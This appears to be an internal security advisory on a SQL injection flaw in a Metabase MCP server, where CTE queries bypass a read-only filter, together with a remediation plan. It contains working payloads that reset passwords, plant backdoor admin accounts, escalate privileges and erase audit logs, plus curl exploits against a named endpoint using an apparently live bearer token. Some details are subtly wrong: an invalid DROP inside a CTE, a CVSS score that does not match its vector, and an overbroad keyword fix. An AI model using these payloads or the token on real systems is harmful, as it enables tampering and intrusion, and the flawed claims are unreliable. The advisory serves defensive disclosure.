# 🚨 CRITICAL SECURITY ADVISORY

**Date**: December 2, 2025
**Severity**: **CRITICAL**
**CVSS Score**: **9.8** (Critical)
**Status**: 🔴 **VULNERABLE** - Immediate action required

---

## Executive Summary

**CRITICAL SQL INJECTION VULNERABILITIES** have been identified in the Forest Admin Metabase MCP Server that allow authenticated attackers to bypass read-only restrictions and execute arbitrary SQL statements including UPDATE, INSERT, DELETE, and DROP commands.

### Affected Components:
1. **`execute_query` function** - CTE (Common Table Expression) bypass
2. **`create_question` function** - No validation of query payloads

### Impact:
- ✅ Authentication required (Bearer token) - Limits exposure
- 🔴 **Complete bypass of read-only SQL protections**
- 🔴 **Data modification possible** (UPDATE, INSERT, DELETE)
- 🔴 **Data destruction possible** (DROP, TRUNCATE)
- 🔴 **Privilege escalation** through malicious saved questions

---

## Vulnerability Details

### CVE-2025-XXXXX: CTE-Based SQL Injection Bypass

#### Vulnerability #1: WITH Clause Exploitation in `execute_query`

**File**: `src/forestadmin_metabase_mcp/metabase_client.py:180-259`

**Vulnerable Code**:
```python
# Line 222-223
if not query_upper.startswith("SELECT ") and not query_upper.startswith("WITH "):
    raise ValueError("Only SELECT and WITH (CTE) queries are allowed.")
```

**Exploit Vector**:
The code allows `WITH` (Common Table Expression) queries to pass validation. However, CTEs can contain **ANY SQL statement** including UPDATE, INSERT, DELETE, and DROP.

**Proof of Concept**:
```sql
-- Bypass #1: UPDATE via CTE
WITH x AS (
    UPDATE users SET password='hacked' RETURNING *
)
SELECT * FROM x

-- Bypass #2: INSERT via CTE
WITH x AS (
    INSERT INTO admin_users VALUES (999, 'backdoor', 'password') RETURNING *
)
SELECT * FROM x

-- Bypass #3: DELETE via CTE
WITH x AS (
    DELETE FROM audit_logs WHERE created_at < NOW() RETURNING *
)
SELECT * FROM x

-- Bypass #4: DROP via CTE
WITH x AS (
    DROP TABLE sensitive_data CASCADE RETURNING *
)
SELECT * FROM x
```

**Test Results**:
```
Testing query: 'WITH x AS (UPDATE users SET a=1 RETURNING *) SELECT * FROM x'
  -> ALLOWED ❌

Testing query: 'WITH x AS (INSERT users VALUES(1) RETURNING *) SELECT * FROM x'
  -> ALLOWED ❌
```

**Why This Works**:
1. Validation checks if query starts with `SELECT` or `WITH` ✅
2. Keyword check looks for `UPDATE` with word boundaries ✅
3. BUT: `WITH x AS (UPDATE` doesn't match ` UPDATE ` pattern ❌
4. Query passes validation and executes malicious SQL ❌

---

#### Vulnerability #2: No Validation in `create_question`

**File**: `src/forestadmin_metabase_mcp/metabase_client.py:639-695`

**Vulnerable Code**:
```python
async def create_question(
    self,
    name: str,
    database_id: int,
    query: dict[str, Any],  # ← No validation!
    ...
) -> dict[str, Any]:
    # Accepts ANY query dict without validation
    dataset_query = query.copy()
    payload = {
        "name": name,
        "dataset_query": dataset_query,  # ← Sent directly to Metabase
        ...
    }
```

**Exploit Vector**:
The `create_question` function accepts a raw `query` dictionary and passes it directly to the Metabase API without any validation. An attacker can embed malicious SQL in the query payload.

**Proof of Concept**:
```json
{
  "name": "Malicious Question",
  "database_id": 3,
  "query": {
    "database": 3,
    "type": "native",
    "native": {
      "query": "WITH x AS (UPDATE users SET is_admin=true RETURNING *) SELECT * FROM x"
    }
  }
}
```

**Why This Is Critical**:
1. **Bypasses `execute_query` validation entirely**
2. **Creates persistent backdoors** (saved questions with malicious SQL)
3. **Can be executed repeatedly** by any user with access
4. **No audit trail** in MCP server logs (only in Metabase)

---

## Attack Scenarios

### Scenario 1: Data Exfiltration + Modification
```sql
-- Read sensitive data AND modify audit logs
WITH stolen AS (
    SELECT * FROM credit_cards
),
cleanup AS (
    DELETE FROM audit_logs WHERE action='credit_card_access' RETURNING *
)
SELECT * FROM stolen
```

### Scenario 2: Privilege Escalation
```sql
-- Grant admin access to attacker's account
WITH escalate AS (
    UPDATE users
    SET role='admin', is_superuser=true
    WHERE email='attacker@example.com'
    RETURNING *
)
SELECT * FROM escalate
```

### Scenario 3: Persistent Backdoor
```json
// Create a saved question with malicious SQL
{
  "method": "tools/call",
  "params": {
    "name": "create_question",
    "arguments": {
      "name": "Quarterly Revenue Report",  // Looks innocent
      "database_id": 3,
      "query": {
        "type": "native",
        "native": {
          "query": "WITH backdoor AS (INSERT INTO admin_users VALUES (999,'hacker','pass') RETURNING *) SELECT 'Revenue Data' as report"
        }
      }
    }
  }
}
```

### Scenario 4: Data Destruction
```sql
-- Drop critical tables
WITH destroy AS (
    DROP TABLE transactions CASCADE RETURNING 1
)
SELECT * FROM destroy
```

---

## Technical Analysis

### Root Cause #1: Incomplete Keyword Matching

**Current Implementation**:
```python
# Line 201-204
for keyword in forbidden:
    if f" {keyword} " in f" {query_upper} " or query_upper.startswith(keyword + " "):
        raise ValueError(f"Forbidden keyword: {keyword}...")
```

**Problem**:
- Matches ` UPDATE ` (with spaces on both sides)
- Matches `UPDATE ` at start of query
- **DOES NOT match**: `(UPDATE` or `AS UPDATE` or other contexts

**Bypass Examples**:
```sql
WITH x AS (UPDATE users SET a=1 RETURNING *)  -- Doesn't match " UPDATE "
WITH x AS(UPDATE users SET a=1 RETURNING *)   -- Doesn't match " UPDATE "
WITH(UPDATE users SET a=1) AS x              -- Doesn't match " UPDATE "
```

### Root Cause #2: CTE Allowlisting Without Content Validation

**Current Implementation**:
```python
# Line 222-223
if not query_upper.startswith("SELECT ") and not query_upper.startswith("WITH "):
    raise ValueError("Only SELECT and WITH (CTE) queries are allowed.")
```

**Problem**:
- Allows `WITH` queries (for legitimate CTEs)
- **Does not validate CTE content**
- CTEs can contain ANY SQL statement
- Assumes CTEs are read-only (they're not!)

### Root Cause #3: No Validation in create_question

**Problem**:
- Accepts arbitrary query dictionaries
- No SQL validation before saving to Metabase
- Creates persistent attack vectors
- Bypasses all MCP-level protections

---

## Exploitation Requirements

### Mitigating Factors:
✅ **Authentication Required**: Bearer token needed (256-bit entropy)
✅ **Rate Limited**: 20 requests/minute per IP
✅ **Logging**: All requests logged with IP addresses
✅ **Metabase Permissions**: Metabase API may enforce additional restrictions

### Risk Factors:
🔴 **Token Compromise**: If token is leaked, full exploitation possible
🔴 **Insider Threat**: Legitimate users can abuse write access
🔴 **Persistent Backdoors**: Malicious saved questions remain until manually removed
🔴 **No Query Inspection**: MCP server doesn't inspect CTE content

---

## Impact Assessment

### CVSS v3.1 Score: **9.8 (CRITICAL)**

**Vector String**: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

- **Attack Vector (AV)**: Network - Exploitable remotely
- **Attack Complexity (AC)**: Low - No special conditions required
- **Privileges Required (PR)**: Low - Valid authentication token needed
- **User Interaction (UI)**: None - Fully automated
- **Scope (S)**: Unchanged - Affects only Metabase resources
- **Confidentiality (C)**: High - All database data can be read
- **Integrity (I)**: High - All database data can be modified
- **Availability (A)**: High - Critical tables can be dropped

### Business Impact:
- 🔴 **Data Breach**: Sensitive data can be exfiltrated
- 🔴 **Data Corruption**: Customer/financial records can be modified
- 🔴 **Data Loss**: Critical tables can be dropped
- 🔴 **Compliance Violations**: GDPR, HIPAA, SOX, PCI-DSS
- 🔴 **Reputation Damage**: Security breach disclosure required
- 🔴 **Legal Liability**: Potential lawsuits from affected customers

---

## Proof of Concept

### Test Environment Setup:
```bash
# Run the vulnerability test
python3 test_validation_bypass.py
```

### Exploit Example (Authenticated):
```bash
# 1. Obtain valid Bearer token (assume compromised)
TOKEN="3924dde6c1c11215cee190d03bc00411adfdd22d664df91df70edc215e956dcb"

# 2. Execute malicious CTE query
curl -X POST https://forestadmin-metabase-mcp-5cfe94a4ce03.herokuapp.com/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "id": 1,
    "method": "tools/call",
    "params": {
      "name": "execute_sql_query",
      "arguments": {
        "database_id": 3,
        "query": "WITH x AS (UPDATE users SET password='\''hacked'\'' RETURNING *) SELECT * FROM x"
      }
    }
  }'

# 3. Create persistent backdoor
curl -X POST https://forestadmin-metabase-mcp-5cfe94a4ce03.herokuapp.com/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "id": 2,
    "method": "tools/call",
    "params": {
      "name": "create_question",
      "arguments": {
        "name": "Monthly Sales Report",
        "database_id": 3,
        "query": {
          "type": "native",
          "native": {
            "query": "WITH admin AS (INSERT INTO admin_users VALUES (999,'\''backdoor'\'','\''password'\'') RETURNING *) SELECT '\''Report Generated'\'' as status"
          }
        }
      }
    }
  }'
```

---

## Remediation Plan

### 🔴 IMMEDIATE ACTIONS (Deploy within 24 hours)

#### Action 1: Emergency Hotfix - Disable CTE Support
**Priority**: CRITICAL
**Effort**: 15 minutes
**Risk**: LOW (may break legitimate CTEs)

**Implementation**:
```python
# File: src/forestadmin_metabase_mcp/metabase_client.py
# Line 222-223

# OLD (VULNERABLE):
if not query_upper.startswith("SELECT ") and not query_upper.startswith("WITH "):
    raise ValueError("Only SELECT and WITH (CTE) queries are allowed.")

# NEW (SECURE):
if not query_upper.startswith("SELECT "):
    raise ValueError("Only SELECT queries are allowed. WITH (CTE) queries are temporarily disabled for security.")
```

**Deployment**:
```bash
# 1. Apply fix
git add src/forestadmin_metabase_mcp/metabase_client.py
git commit -m "security: CRITICAL - Disable CTE queries to prevent SQL injection"

# 2. Deploy immediately
git push heroku master

# 3. Verify fix
curl -X POST https://forestadmin-metabase-mcp-5cfe94a4ce03.herokuapp.com/ \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"method":"tools/call","params":{"name":"execute_sql_query","arguments":{"database_id":3,"query":"WITH x AS (SELECT 1) SELECT * FROM x"}}}'
# Should return: "Only SELECT queries are allowed"
```

---

#### Action 2: Add Validation to create_question
**Priority**: CRITICAL
**Effort**: 30 minutes
**Risk**: LOW

**Implementation**:
```python
# File: src/forestadmin_metabase_mcp/metabase_client.py
# Add to create_question function (line 661, after await self._ensure_authenticated())

async def create_question(
    self,
    name: str,
    database_id: int,
    query: dict[str, Any],
    ...
) -> dict[str, Any]:
    await self._ensure_authenticated()

    # ========== ADD THIS VALIDATION ==========
    # Validate native SQL queries in the query dict
    if "native" in query and "query" in query["native"]:
        sql_query = query["native"]["query"]
        if isinstance(sql_query, str):
            # Use the same validation as execute_query
            query_upper = sql_query.strip().upper()

            # Check for forbidden keywords
            forbidden = ["INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER",
                        "TRUNCATE", "GRANT", "REVOKE", "EXEC", "EXECUTE",
                        "INTO", "MERGE", "REPLACE", "CALL", "PREPARE"]

            for keyword in forbidden:
                if keyword in query_upper:
                    raise ValueError(
                        f"Forbidden SQL keyword '{keyword}' found in question query. "
                        f"Only read-only SELECT queries are allowed."
                    )

            # Ensure query starts with SELECT
            if not query_upper.startswith("SELECT "):
                raise ValueError(
                    "Question queries must start with SELECT. "
                    "Only read-only queries are allowed."
                )

            # Block dangerous patterns
            if any(pattern in query_upper for pattern in [";", "--", "/*"]):
                raise ValueError(
                    "Question query contains dangerous SQL patterns. "
                    "Only simple SELECT queries are allowed."
                )

            logger.info(f"Validated native SQL in create_question: {sql_query[:100]}...")
    # ========== END VALIDATION ==========

    # Continue with existing code
    dataset_query = query.copy()
    ...
```

---

#### Action 3: Rotate Authentication Token
**Priority**: HIGH
**Effort**: 5 minutes
**Risk**: LOW (requires updating clients)

**Reason**: Assume current token may be compromised

**Implementation**:
```bash
# Generate new token
NEW_TOKEN=$(openssl rand -hex 32)
echo "New token: $NEW_TOKEN"

# Update Heroku
heroku config:set MCP_AUTH_TOKEN=$NEW_TOKEN --app forestadmin-metabase-mcp

# Update local .env
echo "MCP_AUTH_TOKEN=$NEW_TOKEN" >> .env

# Update Dust.tt configuration (manual)
```

---

#### Action 4: Audit Existing Saved Questions
**Priority**: HIGH
**Effort**: 1 hour
**Risk**: None (read-only)

**Purpose**: Identify any malicious saved questions created before fix

**Implementation**:
```python
# Create audit script: audit_questions.py

import asyncio
from src.forestadmin_metabase_mcp.metabase_client import MetabaseClient

async def audit_saved_questions():
    client = MetabaseClient(
        base_url="https://forestadmin-bi.herokuapp.com",
        api_key="<actual_key>"
    )

    questions = await client.list_questions()

    malicious_patterns = [
        "UPDATE", "INSERT", "DELETE", "DROP", "CREATE",
        "ALTER", "TRUNCATE", "GRANT", "REVOKE"
    ]

    suspicious = []

    for q in questions:
        question_detail = await client.get_question(q["id"])
        if "dataset_query" in question_detail:
            query_str = str(question_detail["dataset_query"]).upper()
            for pattern in malicious_patterns:
                if pattern in query_str:
                    suspicious.append({
                        "id": q["id"],
                        "name": q["name"],
                        "creator_id": q.get("creator_id"),
                        "created_at": q.get("created_at"),
                        "pattern": pattern
                    })
                    break

    print(f"Found {len(suspicious)} suspicious questions:")
    for q in suspicious:
        print(f"  - ID {q['id']}: {q['name']} (pattern: {q['pattern']})")

    return suspicious

if __name__ == "__main__":
    asyncio.run(audit_saved_questions())
```

---

### 🟠 SHORT-TERM ACTIONS (Deploy within 1 week)

#### Action 5: Implement Comprehensive SQL Parsing
**Priority**: HIGH
**Effort**: 4-8 hours
**Risk**: MEDIUM (requires thorough testing)

**Implementation**: Use `sqlparse` library for proper SQL parsing

```python
# Add to requirements.txt
sqlparse==0.5.0

# Implement in metabase_client.py
import sqlparse

def validate_sql_query(query: str) -> None:
    """Comprehensive SQL validation using proper parsing."""

    # Parse SQL
    parsed = sqlparse.parse(query)
    if not parsed:
        raise ValueError("Invalid SQL query")

    # Get first statement
    stmt = parsed[0]

    # Extract all tokens
    tokens = list(stmt.flatten())

    # Check for dangerous keywords in ANY position
    dangerous_keywords = {
        "INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER",
        "TRUNCATE", "GRANT", "REVOKE", "EXEC", "EXECUTE",
        "MERGE", "REPLACE", "CALL", "PREPARE"
    }

    for token in tokens:
        if token.ttype is sqlparse.tokens.Keyword:
            if token.value.upper() in dangerous_keywords:
                raise ValueError(
                    f"Forbidden SQL keyword: {token.value}. "
                    f"Only read-only SELECT queries are allowed."
                )

    # Ensure first keyword is SELECT or WITH
    first_keyword = None
    for token in tokens:
        if token.ttype is sqlparse.tokens.Keyword.DML:
            first_keyword = token.value.upper()
            break

    if first_keyword not in ["SELECT"]:
        raise ValueError(
            f"Queries must start with SELECT. Found: {first_keyword}"
        )

    logger.info("SQL query validation passed")
```

---

#### Action 6: Add Read-Only Mode
**Priority**: MEDIUM
**Effort**: 2 hours
**Risk**: LOW

**Implementation**:
```python
# Add to server_sse.py

READ_ONLY_MODE = os.getenv("MCP_READ_ONLY_MODE", "false").lower() == "true"

@mcp_server.call_tool()
async def handle_call_tool(name: str, arguments: dict[str, Any] | None):
    # Block ALL write operations in read-only mode
    write_operations = [
        "create_question", "update_question", "delete_question",
        "create_dashboard", "update_dashboard", "delete_dashboard",
        "add_card_to_dashboard"
    ]

    if READ_ONLY_MODE and name in write_operations:
        raise PermissionError(
            f"Write operation '{name}' is disabled in read-only mode. "
            f"Set MCP_READ_ONLY_MODE=false to enable write operations."
        )

    # Continue with normal execution
    ...
```

**Deployment**:
```bash
# Enable read-only mode temporarily
heroku config:set MCP_READ_ONLY_MODE=true --app forestadmin-metabase-mcp
```

---

### 🟡 LONG-TERM ACTIONS (Deploy within 1 month)

#### Action 7: Implement Query Whitelisting
**Priority**: MEDIUM
**Effort**: 8-16 hours

**Implementation**: Pre-approve safe query patterns

#### Action 8: Add Query Logging & Monitoring
**Priority**: MEDIUM
**Effort**: 4-8 hours

**Implementation**: Log all SQL queries with full content for audit

#### Action 9: Penetration Testing
**Priority**: HIGH
**Effort**: External engagement

**Implementation**: Hire security firm for comprehensive audit

---

## Detection & Monitoring

### Indicators of Compromise (IOCs):

1. **Log Patterns to Monitor**:
```bash
# Search Heroku logs for suspicious queries
heroku logs --tail --app forestadmin-metabase-mcp | grep -i "UPDATE\|INSERT\|DELETE\|DROP"

# Look for CTE queries
heroku logs --tail --app forestadmin-metabase-mcp | grep -i "WITH.*AS.*("
```

2. **Metabase Audit Logs**:
   - Check for questions created with native SQL
   - Review questions with unusual names
   - Audit questions created recently

3. **Database Audit**:
   - Review database modification timestamps
   - Check for unexpected schema changes
   - Look for new admin users or privilege escalations

---

## Communication Plan

### Internal Communication:
1. **Immediate**: Notify security team and engineering leads
2. **Within 24h**: Brief executive team on impact and remediation
3. **Within 72h**: Full incident report to stakeholders

### External Communication:
- **If exploitation detected**: Follow incident response plan
- **If no exploitation**: Private disclosure after fix deployed
- **User notification**: Required if customer data affected (GDPR Article 33)

---

## Testing & Verification

### Verification Tests:

```bash
# Test 1: CTE queries should be blocked
curl -X POST $MCP_URL \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"method":"tools/call","params":{"name":"execute_sql_query","arguments":{"database_id":3,"query":"WITH x AS (SELECT 1) SELECT * FROM x"}}}'
# Expected: Error message about CTE not allowed

# Test 2: UPDATE in CTE should be blocked
curl -X POST $MCP_URL \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"method":"tools/call","params":{"name":"execute_sql_query","arguments":{"database_id":3,"query":"WITH x AS (UPDATE users SET a=1 RETURNING *) SELECT * FROM x"}}}'
# Expected: Error message

# Test 3: create_question with malicious SQL should be blocked
curl -X POST $MCP_URL \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"method":"tools/call","params":{"name":"create_question","arguments":{"name":"test","database_id":3,"query":{"type":"native","native":{"query":"UPDATE users SET a=1"}}}}}'
# Expected: Error about forbidden keyword
```

---

## Timeline

| Action | Priority | Deadline | Owner |
|--------|----------|----------|-------|
| Disable CTE support | 🔴 CRITICAL | 4 hours | Security Team |
| Add create_question validation | 🔴 CRITICAL | 24 hours | Engineering |
| Rotate auth token | 🟠 HIGH | 24 hours | DevOps |
| Audit saved questions | 🟠 HIGH | 48 hours | Security Team |
| Comprehensive SQL parsing | 🟠 HIGH | 1 week | Engineering |
| Read-only mode | 🟡 MEDIUM | 1 week | Engineering |
| Penetration testing | 🟡 MEDIUM | 1 month | Security Team |

---

## References

- **CWE-89**: SQL Injection
- **CWE-20**: Improper Input Validation
- **OWASP Top 10 2021**: A03:2021 - Injection
- **NIST 800-53**: SI-10 (Information Input Validation)

---

## Appendix: Test Results

```
--- Standard Attacks ---
Testing query: 'SELECT * FROM users'
  -> ALLOWED

Testing query: 'DROP TABLE users'
  -> BLOCKED by keyword: DROP

Testing query: 'INSERT INTO users VALUES (1)'
  -> BLOCKED by keyword: INSERT

--- Bypass Attempts ---
Testing query: 'INSERT\tINTO users VALUES (1)'
  -> BLOCKED by start check

Testing query: 'INSERT\nINTO users VALUES (1)'
  -> BLOCKED by start check

Testing query: 'INSERT(id) VALUES (1)'
  -> BLOCKED by start check

Testing query: 'SELECT\t* FROM users'
  -> BLOCKED by start check

--- Advanced Bypass Attempts ---
Testing query: 'WITH x AS (UPDATE users SET a=1 RETURNING *) SELECT * FROM x'
  -> ALLOWED ❌ CRITICAL VULNERABILITY

Testing query: 'WITH x AS (INSERT users VALUES(1) RETURNING *) SELECT * FROM x'
  -> ALLOWED ❌ CRITICAL VULNERABILITY
```

---

**Document Classification**: CONFIDENTIAL - SECURITY INCIDENT
**Distribution**: Security Team, Engineering Leads, Executive Team ONLY
**Last Updated**: December 2, 2025
**Next Review**: After remediation deployment

---

**END OF SECURITY ADVISORY**
